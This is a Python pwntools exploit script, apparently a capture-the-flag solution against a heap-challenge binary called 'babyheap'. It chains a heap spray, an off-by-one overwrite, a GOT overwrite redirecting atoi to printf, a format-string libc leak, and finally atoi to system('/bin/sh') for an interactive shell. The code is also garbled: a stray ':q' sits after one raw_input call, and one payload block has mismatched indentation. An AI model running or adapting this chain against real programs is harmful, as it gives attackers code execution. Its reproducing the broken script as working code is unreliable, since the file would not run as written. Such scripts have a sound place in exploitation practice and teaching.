from pwn import *

context.log_level='debug'

def New(size,content,name):
	s.recvuntil('Your choice:')
	s.sendline('1')
	s.recvuntil('Size :')
	s.sendline(str(size))
	s.recvuntil('Content:')
	s.send(content)
	s.recvuntil('Name:')
	s.send(name)

def Delete():
	s.recvuntil('Your choice:')
	s.sendline('2')

def Edit(content):
	s.recvuntil('Your choice:')
	s.sendline('3')
	s.recvuntil('Content:')
	s.sendline(content)

def Exit(payload):
	s.recvuntil('Your choice:')
	s.sendline('4')
	s.recvuntil('Really? (Y/n)')
	s.sendline(payload)

if __name__ == '__main__':

	s=process('./babyheap')

	e=ELF('./babyheap')

	scanf_chunk='n'+"\x00"*(0x1000-0x18-0x1) #heap spray
	scanf_chunk+=p64(0x81) #this fake heap chunk will be free
	Exit(scanf_chunk)
	
	raw_input('scanf -> heap spray COMPLETE')

	fake_chunk=p64(0)*7+p64(0x21)

	New(80,fake_chunk,'vuln'*2) #name 8byte+'\x00' => off-by-one
	
	raw_input('fake top chunk size(next chunk size) COMPLETE'):q

	Delete()

	raw_input("off-by-one -> vuln chunk free COMPLETE")

	fake_chunk='A'*0x30
	fake_chunk+=p64(e.got['free']) 
	New(110,fake_chunk,'origin')	
	
	raw_input("change control heap chunk COMPLETE") 

	payload=p64(e.plt['free']+0x6)
	payload+=p64(0x400C37) #exit => retn
	payload+=p64(e.plt['__read_chk']+0x6)
	payload+=p64(e.plt['puts']+0x6)
	payload+=p64(e.plt['__stack_chk_fail']+0x6)
	payload+=p64(e.plt['printf']+0x6)
	payload+=p64(e.plt['alarm']+0x6)
	payload+=p64(e.plt['read']+0x6)
	payload+=p64(e.plt['__libc_start_main']+0x6)
	payload+=p64(e.plt['signal']+0x6)
	payload+=p64(e.plt['malloc']+0x6)
	payload+=p64(e.plt['setvbuf']+0x6)
	payload+=p64(e.plt['printf']+0x6) #atoi -> printf #0x602078
	payload+=p64(e.plt['__isoc99_scanf']+0x6) #0x602080
	#payload+='A'*0x20
	#payload+=p64(0xffffffff)

	Edit(payload)	
	raw_input('1')	
	s.recvuntil('Your choice:')
	
	s.sendline('%p %p %p')	
	s.recvuntil(' ')
	s.recvuntil(' ')	
	libc_leak=s.recvuntil('\n')
	libc_leak=libc_leak.strip('\n')

	libc_leak=int(libc_leak,16)
	libc_base=libc_leak-0x11755c
	system=libc_base+0x45390

    payload=p64(e.plt['free']+0x6)
    payload+=p64(0x400C37) #exit => retn
    payload+=p64(e.plt['__read_chk']+0x6)
    payload+=p64(e.plt['puts']+0x6)
    payload+=p64(e.plt['__stack_chk_fail']+0x6)
    payload+=p64(e.plt['printf']+0x6)
    payload+=p64(e.plt['alarm']+0x6)
    payload+=p64(e.plt['read']+0x6)
    payload+=p64(e.plt['__libc_start_main']+0x6)
    payload+=p64(e.plt['signal']+0x6)
    payload+=p64(e.plt['malloc']+0x6)
    payload+=p64(e.plt['setvbuf']+0x6)
    payload+=p64(system) #atoi -> system()
    payload+=p64(e.plt['__isoc99_scanf']+0x6) 

	print "libc_leak: "+ str(hex(libc_leak))
	print "libc_base: "+ str(hex(libc_base))
	print "system_addr: "+ str(hex(system))	
	
	s.recvuntil('Your choice:')
	s.sendline('%3')
	s.recvuntil('Content:')
	s.sendline(payload)
	
	s.recvuntil('Your choice:')
	s.sendline('/bin/sh\x00') #atoi("/bin/sh") -> system("/bin/sh\x00")

	s.interactive()

